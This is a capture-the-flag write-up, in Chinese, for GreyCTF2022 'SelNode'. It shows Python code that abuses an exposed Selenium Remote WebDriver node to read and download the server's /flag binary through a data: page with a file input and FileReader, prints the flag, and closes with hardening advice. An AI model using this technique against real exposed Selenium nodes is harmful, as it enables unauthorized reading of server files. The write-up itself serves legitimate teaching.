# GreyCTF2022 - SelNode

## 题目简述

目标公开了 Selenium 3.141.59 Remote WebDriver 节点。攻击者可以创建浏览器会话并指定浏览器打开本地文件；flag 位于服务器上的可执行文件 `/flag`，需要把二进制内容下载到本地后运行。

## 解题过程

直接访问 `file:///etc/passwd` 可证明浏览器具有本地文件读取能力，但二进制 `/flag` 不能作为普通页面可靠显示。创建一个 `data:` 页面，放置 file input 和 `FileReader`，再让 Selenium 的 `send_keys` 把服务端路径 `/flag` 填入控件：

```python
driver.get('data:text/html,<input id=f type=file onchange="r(event)">'
           '<script>let out;function r(e){let x=new FileReader();'
           'x.onload=()=>out=x.result;x.readAsDataURL(e.target.files[0])}</script>')
driver.find_element('id', 'f').send_keys('/flag')
data_url = driver.execute_script('return out')
binary = base64.b64decode(data_url.split(',', 1)[1])
open('flag', 'wb').write(binary)
```

浏览器运行在远端节点，file input 读取的正是远端 `/flag`。下载后赋予执行权限并运行，得到：

```text
grey{publ1c_53l3n1um_n0d3_15_50_d4n63r0u5_8609b8f4caa2c513}
```

## 方法总结

公开 Remote WebDriver 等价于向未授权用户开放浏览器能力。`file://`、上传控件、下载目录和启动参数都可能跨越文件边界；防护应把节点置于受信网络、启用认证，并在低权限隔离容器中运行。
